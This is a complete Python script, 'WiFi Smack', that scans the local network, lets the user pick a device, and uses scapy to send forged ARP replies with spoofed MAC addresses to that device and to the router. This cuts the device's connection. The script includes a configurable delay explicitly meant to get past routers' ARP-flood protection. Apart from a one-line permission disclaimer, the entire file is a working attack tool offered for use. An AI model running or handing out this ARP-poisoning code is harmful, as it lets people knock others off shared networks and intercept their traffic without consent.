from scapy.all import *
from multiprocessing import Process

print("\n                              # WiFi Smack by benjibobs #")
print("# This is just a simple, configurable ARP poisoning script that is compatible with Python 3. #")
print("            # Only use on networks which you have permission to mess with #\n")


def poison(target_ip, target_mac, gateway_ip, gateway_mac, delay):
    while True:
        send(ARP(op=2, psrc=gateway_ip, hwsrc='66:D1:7F:A1:6F:4C', pdst=target_ip, hwdst=target_mac))
        send(ARP(op=2, psrc=target_ip, hwsrc='66:D0:7F:A1:6F:4D', pdst=gateway_ip, hwdst=gateway_mac))
        time.sleep(delay)


def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    send(ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac))
    send(ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac))


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("1.1.1.1", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def get_ip_mask():
    tmp = get_local_ip().split('.')[:-1]
    tmp.append("*")
    return '.'.join(tmp)


def get_devices(ip_mask):
    answers, uans = arping(ip_mask)
    devices = []
    for answer in answers:
        mac = answer[1].hwsrc
        ip = answer[1].psrc
        devices.append((ip, mac))
    return devices


def print_device_list(devices):
    print("\nList of connected devices:\n")
    is_router = True
    n = 0
    for device in devices:
        if is_router:
            gateway = device
            is_router = False
            continue
        n += 1
        print("{}) {} ({})".format(n, device[0], device[1]))

    print(
        "\nYour router's IP has been detected as > {} < - if this is incorrect please make an issue on GitHub with as "
        "much detail as possible!\n".format(gateway[0]))

    target = input("Please select a device to smack (1 - {} or 'r' to refresh device list): ".format(n))

    if target == 'r' or target == 'R':
        print_device_list(get_devices(get_ip_mask()))
        exit()
    else:
        target = int(target)
    if 1 <= target <= n:
        target = devices[target]
        print(
            "\nSome routers defend against ARP flooding, so you may now choose a delay between each poisoned packet in "
            "order to try and mitigate this. If your router does not protect against ARP flooding, just enter 0!")
        delay = float(float(input("Please enter a delay in milliseconds between each packet: ")) / 1000.0)
        print(
            "\nSmacking connection for {} with a delay of {} seconds. Use Control+C to stop smacking the connection".format(
                target[0], delay))
        thread = Process(target=poison, args=(target[0], target[1], gateway[0], gateway[1], delay))
        try:
            thread.start()
            thread.join()
        except KeyboardInterrupt:
            thread.terminate()
            print("\nRestoring connection for {}\n".format(target[0]))
            restore(target[0], target[1], gateway[0], gateway[1])
            print_device_list(devices)
            exit()
    else:
        print("\n\n\nNo device with the identifier {}\n\n\n".format(target))
        print_device_list(devices)
        exit()


if os.geteuid() != 0:
    print("This script must be run as root, try using sudo.")
    exit()

conf.verb = 0  # level of verbosity, from 0 (almost mute) to 3 (verbose)
conf.iface = input("Name of interface (eth0 or similar): ")

print_device_list(get_devices(get_ip_mask()))
